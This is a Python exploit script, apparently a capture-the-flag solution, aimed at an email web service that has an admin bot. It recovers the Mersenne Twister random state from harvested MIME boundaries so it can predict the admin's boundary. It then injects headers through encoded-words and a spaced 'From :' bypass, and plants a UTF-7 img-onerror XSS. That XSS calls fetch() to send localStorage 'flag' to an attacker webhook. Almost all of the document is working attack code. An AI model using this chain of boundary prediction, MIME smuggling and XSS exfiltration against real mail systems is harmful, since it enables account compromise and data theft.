#!/usr/bin/env python3
import base64
import re
import sys
import time
from urllib.parse import urljoin

import requests
from requests import Session
from z3_crack import Untwister

try:
    from tqdm import tqdm
except Exception:
    tqdm = lambda x, **kw: x


def die(msg):
    print(f"[-] {msg}", file=sys.stderr)
    sys.exit(1)


def info(msg):
    print(f"[+] {msg}")


class SESExploit:
    def __init__(self, base_url, webhook, password=None, samples=800):
        self.base_url = base_url.rstrip('/')
        self.webhook = webhook.rstrip('/')
        self.password = password
        self.samples = samples
        self.s = Session()

    def api(self, path):
        return urljoin(self.base_url + '/', path.lstrip('/'))

    def get_creds(self):
        if self.password:
            return {"username": "user@ses", "password": self.password}
        r = requests.get(self.api('/api/password'), timeout=20)
        r.raise_for_status()
        pw = r.json()
        if pw == 'already seen':
            die('/api/password ya fue consultado. Pasa la password como tercer argumento.')
        return {"username": "user@ses", "password": pw}

    def login(self):
        creds = self.get_creds()
        r = requests.post(self.api('/api/login'), json=creds, timeout=20)
        if r.status_code != 200:
            die(f'login fallido: HTTP {r.status_code} {r.text[:200]}')
        token = r.json()
        self.s.headers.update({'token': token})
        info('Login correcto como user@ses')

    def send(self, to, subject, body):
        r = self.s.post(self.api('/api/send'), json={
            'to': to,
            'subject': subject,
            'body': body,
        }, timeout=20)
        if r.status_code != 200:
            die(f'/api/send fallo: HTTP {r.status_code} {r.text[:500]}')
        return r.json()

    def email(self, email_id):
        r = self.s.get(self.api(f'/api/email/{email_id}'), timeout=20)
        if r.status_code != 200:
            die(f'/api/email fallo: HTTP {r.status_code} {r.text[:300]}')
        return r.json()

    def admin_bot(self):
        r = self.s.post(self.api('/api/admin_bot'), timeout=30)
        if r.status_code != 200:
            die(f'/api/admin_bot fallo: HTTP {r.status_code} {r.text[:300]}')
        return r.json()

    def get_boundary(self):
        email_id = self.send('user@ses', 'Hi', 'Bro')
        raw = self.email(email_id)['data']
        m = re.search(r'===============(\d+)==', raw)
        if not m:
            die('no pude extraer boundary del email')
        return int(m.group(1))

    def crack_random(self):
        info(f'Recolectando {self.samples} boundaries para clonar MT19937...')
        ut = Untwister()
        for _ in tqdm(range(self.samples)):
            b = bin(self.get_boundary())[2:].zfill(63)
            high31, low32 = b[:31], b[31:]
            ut.submit(low32)        # salida completa de 32 bits
            ut.submit(high31 + '?') # falta 1 bit

        info('Resolviendo estado con Z3...')
        rng = ut.get_random()

        predicted = rng.getrandbits(63)
        real = self.get_boundary()
        if predicted != real:
            die(f'prediccion incorrecta: pred={predicted}, real={real}')
        info('Estado clonado correctamente')
        return rng

    def run(self):
        self.login()
        rng = self.crack_random()

        # El email malicioso que enviamos al admin tambien consume un boundary.
        rng.getrandbits(63)

        # Boundary interno del multipart/mixed que generara la respuesta firmada del admin.
        admin_boundary = f'{rng.getrandbits(63):019d}'
        info(f'Boundary admin predicho: {admin_boundary}')

        # Exfiltra localStorage.flag a tu webhook. El resultado llega en Base64 en la query string.
        js = f'fetch("{self.webhook}?"+btoa(localStorage.getItem("flag")))'
        js_b64 = base64.b64encode(js.encode()).decode().replace('=', '+AD0-')

        # UTF-7: el parser lo transforma a HTML real. Los espacios antes del boundary evitan que
        # Python cambie el boundary a .0, pero el parser WASM todavia lo acepta.
        payload = f'''hi
   --==============={admin_boundary}==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0

+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-eval(atob('{js_b64}'))+ADs-+ACA-/+AD4-
   --==============={admin_boundary}==
'''

        encoded_payload = base64.b64encode(payload.encode()).decode()

        # 1) encoded-word mantiene saltos de linea en el subject tras parsear.
        # 2) From : con espacio antes de ':' evita el filtro de Python, pero el parser lo toma como From.
        subject = f'hi=?ISO-8859-1?B?{encoded_payload}?=\nFrom : admin@ses'

        info('Enviando payload al admin...')
        self.send('admin@ses', subject, 'Impossible W')

        info('Primer admin_bot: el admin responde a su propio correo firmado...')
        self.admin_bot()
        time.sleep(1)

        info('Segundo admin_bot: el admin abre el correo firmado y ejecuta el XSS...')
        self.admin_bot()
        info('Mira tu webhook. Decodifica el parametro de la URL con base64 para ver la flag.')


def main():
    if len(sys.argv) < 3:
        print(f'uso: {sys.argv[0]} <base_url> <webhook_url> [password_user_ses]', file=sys.stderr)
        print(f'ejemplo: {sys.argv[0]} http://127.0.0.1:8000 https://webhook.site/UUID', file=sys.stderr)
        sys.exit(2)
    SESExploit(sys.argv[1], sys.argv[2], sys.argv[3] if len(sys.argv) >= 4 else None).run()


if __name__ == '__main__':
    main()
